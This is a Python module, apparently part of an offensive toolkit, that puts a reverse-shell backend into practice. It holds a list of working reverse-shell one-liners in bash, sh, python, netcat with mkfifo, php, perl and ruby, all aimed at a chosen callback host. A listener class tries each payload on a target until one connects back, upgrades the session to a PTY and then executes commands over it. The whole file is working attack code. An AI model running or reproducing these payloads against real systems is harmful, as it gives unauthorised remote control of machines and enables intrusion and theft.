from __future__ import annotations
"""Reverse shell nyata: listener TCP + payload matrix + upgrade PTY."""
import asyncio, secrets, shlex
from .base import ShellBackend, ExecResult

PAYLOADS = [
    "bash -c 'bash -i >& /dev/tcp/{h}/{p} 0>&1'",
    "sh -c 'sh -i >& /dev/tcp/{h}/{p} 0>&1'",
    "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{h}\",{p}));"
    "[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/sh\")'",
    "python -c 'import socket,os,pty;s=socket.socket();s.connect((\"{h}\",{p}));"
    "[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/sh\")'",
    "rm -f /tmp/.m4z;mkfifo /tmp/.m4z;cat /tmp/.m4z|/bin/sh -i 2>&1|nc {h} {p} >/tmp/.m4z",
    "nc {h} {p} -e /bin/sh",
    "php -r '$s=fsockopen(\"{h}\",{p});while(!feof($s)){{$c=fread($s,1024);"
    "echo shell_exec($c);}}'",
    "perl -e 'use Socket;$i=\"{h}\";$p={p};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
    "connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");"
    "open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
    "ruby -rsocket -e 'f=TCPSocket.open(\"{h}\",{p});exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\","
    "f,f,f)'",
]


class ReverseShell(ShellBackend):
    kind = "reverse"
    streamable = True

    def __init__(self, ctx, sid, target, *, driver: ShellBackend, host: str):
        super().__init__(ctx, sid, target)
        self.driver = driver
        self.host = host
        self.port = 0
        self.connected = asyncio.Event()
        self._server: asyncio.AbstractServer | None = None

    async def _listen(self):
        lo, hi = self.ctx.cfg.get("app.callback_port_range", [40000, 40100])
        for _ in range(24):
            port = secrets.randbelow(hi - lo) + lo
            try:
                self._server = await asyncio.start_server(self._on_conn, "0.0.0.0", port)
                self.port = port
                return
            except OSError:
                continue
        raise RuntimeError("tidak ada port callback bebas")

    async def _on_conn(self, reader, writer):
        if self.connected.is_set():
            writer.close(); return
        self.reader, self.writer = reader, writer
        self.connected.set()

    async def establish(self) -> bool:
        await self._listen()
        try:
            for tpl in PAYLOADS:
                cmd = tpl.format(h=self.host, p=self.port)
                asyncio.create_task(self.driver.exec(cmd, timeout=8))
                try:
                    await asyncio.wait_for(self.connected.wait(), timeout=9)
                    break
                except asyncio.TimeoutError:
                    continue
            if not self.connected.is_set():
                return False
            await self._upgrade_pty()
            return True
        finally:
            if self._server:
                self._server.close()

    async def _upgrade_pty(self):
        await asyncio.sleep(0.4)
        for cmd in (
            "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
            "python -c 'import pty;pty.spawn(\"/bin/sh\")'",
            "script -qc /bin/bash /dev/null",
        ):
            self.writer.write((cmd + "\n").encode())
            await self.writer.drain()
            await asyncio.sleep(0.9)
            self.writer.write(b"export TERM=xterm-256color; stty rows 40 cols 160 2>/dev/null\n")
            await self.writer.drain()
            await asyncio.sleep(0.4)
            r = await self.exec("echo PTY_$((1+1))")
            if "PTY_2" in r.out:
                return

    async def exec(self, cmd: str, timeout: int = 30) -> ExecResult:
        if not self.reader:
            return ExecResult(out="[no stream]", rc=1)
        m = "m4z" + secrets.token_hex(4)
        self.writer.write(f"{cmd}; echo {m}$?\n".encode())
        await self.writer.drain()
        buf = ""
        deadline = asyncio.get_event_loop().time() + timeout
        while True:
            try:
                chunk = await asyncio.wait_for(
                    self.reader.read(65536), timeout=max(0.2, deadline - asyncio.get_event_loop().time()))
            except asyncio.TimeoutError:
                return ExecResult(out=buf + "\n[timeout]", rc=124)
            if not chunk:
                return ExecResult(out=buf + "\n[eof]", rc=1)
            buf += chunk.decode("utf8", "ignore")
            if m in buf:
                head, _, tail = buf.rpartition(m)
                return ExecResult(out=head[-400_000:], rc=int(tail.strip()[:1] or 0))
            if asyncio.get_event_loop().time() > deadline:
                return ExecResult(out=buf[-400_000:], rc=124)
